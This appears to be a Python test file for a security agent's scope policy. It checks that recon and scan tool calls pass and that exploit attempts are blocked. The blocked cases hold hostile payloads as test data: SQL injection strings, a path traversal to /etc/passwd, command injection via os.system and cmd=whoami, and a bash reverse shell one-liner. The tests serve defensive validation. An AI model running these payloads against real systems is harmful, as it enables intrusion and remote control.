"""Issue #45 回归：recon/scan 模式不应误拦正常的侦察/扫描工具调用。"""

from __future__ import annotations

from deepsec.spear.agent.constraint_policy import infer_tool_action, validate_tool_action
from deepsec.spear.agent.context import TaskConstraints


def _scope_recon_scan() -> TaskConstraints:
    return TaskConstraints(allowed_actions=["recon", "scan"], blocked_actions=["post_exploitation"])


def test_options_and_post_are_not_exploit():
    # 方法本身不代表利用：OPTIONS 属侦察、POST 属扫描
    assert infer_tool_action("fetch", {"url": "http://t/", "method": "OPTIONS"}) == "recon"
    assert infer_tool_action("fetch", {"url": "http://t/login", "method": "POST", "body": "a=1"}) == "scan"
    assert (
        infer_tool_action(
            "fetch",
            {"url": "http://t/api", "method": "PUT", "json": {"name": "demo"}},
        )
        == "scan"
    )


def test_requests_in_python_is_scan_not_exploit():
    code = "import requests\nrequests.get('http://t/')"
    assert infer_tool_action("python_execute", {"code": code}) == "scan"


def test_local_meta_tools_are_exempt_from_scope():
    scope = _scope_recon_scan()
    # 加载技能文档 / 编解码不触碰目标，任何范围下都不应被拦
    assert validate_tool_action("load_skill_reference", {"skill_name": "x", "reference_name": "y"}, scope) is None
    assert validate_tool_action("crypto_decode", {"operation": "base64_decode", "input": "eA=="}, scope) is None
    assert validate_tool_action("source_extract", {"evidence_id": "e001"}, scope) is None
    assert validate_tool_action("evidence_search", {"query": "flag"}, scope) is None


def test_recon_scan_scope_allows_normal_probing():
    scope = _scope_recon_scan()
    allowed_cases = [
        ("nmap_scan", {"target": "10.0.0.5", "scan_type": "top_ports"}),
        ("fetch", {"url": "http://t/robots.txt", "method": "GET"}),
        ("fetch", {"url": "http://t/", "method": "OPTIONS"}),
        ("fetch", {"url": "http://t/login", "method": "POST", "body": "u=a&p=b"}),
        ("python_execute", {"code": "import requests\nrequests.get('http://t/')"}),
        ("shell_command", {"command": "curl -i http://t/robots.txt"}),
        ("shell_command", {"command": "php -r \"echo serialize([1,2]);\""}),
    ]
    for name, args in allowed_cases:
        assert validate_tool_action(name, args, scope) is None, f"{name} should be allowed"


def test_actual_exploit_payloads_still_blocked():
    scope = _scope_recon_scan()
    blocked_cases = [
        ("fetch", {"url": "http://t/?id=1 union select 1,2,3", "method": "GET"}),
        ("fetch", {"url": "http://t/?file=../../etc/passwd", "method": "GET"}),
        ("fetch", {"url": "http://t/api", "method": "POST", "json": {"id": "1 union select 1"}}),
        ("fetch", {"url": "http://t/api", "method": "POST", "params": {"file": "../../etc/passwd"}}),
        ("python_execute", {"code": "import os; os.system('id')"}),
        ("python_execute", {"code": "requests.get('http://t/?cmd=whoami')"}),
        ("shell_command", {"command": "curl 'http://t/?id=1 union select 1,2'"}),
        ("shell_command", {"command": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}),
    ]
    for name, args in blocked_cases:
        violation = validate_tool_action(name, args, scope)
        assert violation is not None and "exploit" in violation, f"{name} should be blocked as exploit"
